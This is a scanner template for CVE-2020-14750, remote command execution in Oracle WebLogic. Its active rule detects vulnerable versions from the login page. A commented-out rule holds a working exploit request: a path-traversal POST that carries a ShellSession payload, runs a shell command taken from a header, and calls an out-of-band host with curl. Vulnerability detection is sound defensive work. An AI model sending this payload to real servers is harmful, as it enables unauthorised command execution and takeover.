id: CVE-2020-14750

info:
  name: Oracle WebLogic Server - Remote Command Execution
  author: princechaddha,DhiyaneshDk
  severity: critical
  verified: true
  description: |
    Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised machine without entering necessary credentials. See also CVE-2020-14882, which is addressed in the October 2020 Critical Patch Update.
    SHODAN: http.html:"Weblogic Application Server"
  reference:
    - https://github.com/pprietosanchez/CVE-2020-14750
    - https://www.oracle.com/security-alerts/alert-cve-2020-14750.html
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14750
    - https://nvd.nist.gov/vuln/detail/CVE-2020-14750
  tags: cve,cve2020,rce,oracle,weblogic
  created: 2023/08/17

# set:
#   hostname: request.url.host
#   oob: oob()
#   oobDNS: oob.DNS
#   oobHTTP: oob.HTTP
rules:
  # r0:
  #   request:
  #     raw: |-
  #       POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
  #       Host: {{hostname}}
  #       User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
  #       Accept: */*
  #       cmd: curl {{oobHTTP}}
  #       Content-Type: application/x-www-form-urlencoded

  #       _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
  #       weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
  #       java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
  #       field.setAccessible(true);
  #       Object obj = field.get(adapter);
  #       weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
  #       String cmd = req.getHeader("cmd");
  #       String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
  #       if (cmd != null) {
  #           String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
  #           weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
  #           res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
  #           res.getServletOutputStream().flush();
  #           res.getWriter().write("");
  #       }executeThread.interrupt();
  #       ");
  #   expression: response.raw_header.bcontains(b'ADMINCONSOLESESSION=') && oobCheck(oob, oob.ProtocolHTTP, 3)
  r0:
    request:
      method: GET
      path: /console/login/LoginForm.jsp
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'WebLogic') &&
      (response.body.bcontains(b'10.3.6.0') ||
      response.body.bcontains(b'12.1.3.0') ||
      response.body.bcontains(b'12.2.1.3') ||
      response.body.bcontains(b'12.2.1.4') || response.body.bcontains(b'14.1.1.0'))
expression: r0()
